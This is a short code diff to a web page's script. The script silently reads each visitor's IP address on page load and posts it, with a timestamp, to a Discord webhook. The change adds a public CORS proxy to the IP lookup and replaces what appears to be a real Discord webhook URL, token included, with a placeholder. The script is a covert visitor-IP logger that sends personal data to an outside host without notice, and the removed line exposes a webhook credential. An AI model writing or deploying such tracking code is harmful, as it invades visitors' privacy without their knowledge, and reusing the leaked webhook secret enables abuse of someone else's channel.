@@ -59,14 +59,16 @@
 	</script>
 </body>
 <script>
+  const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
   const ipUrl = 'https://api.ipify.org?format=json';
-  fetch(ipUrl)
+
+  fetch(proxyUrl + ipUrl)
     .then(response => response.json())
     .then(data => {
       const ipAddress = data.ip;
       const arizonaTime = new Date().toLocaleString("en-US", {timeZone: "America/Phoenix"});
       const message = `Visitor IP address: ${ipAddress}\nAccessed on: ${arizonaTime}`;
-      const webhookUrl = 'https://discord.com/api/webhooks/1092929148961443971/gZoiH6RtEbBe47iaSmPvzFoVBLHiYEAaatyBDUaK3pI4rErTE_L4_zGwFlv6lnczmX0U';
+      const webhookUrl = 'https://discord.com/api/webhooks/your-webhook-url';
       fetch(webhookUrl, {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
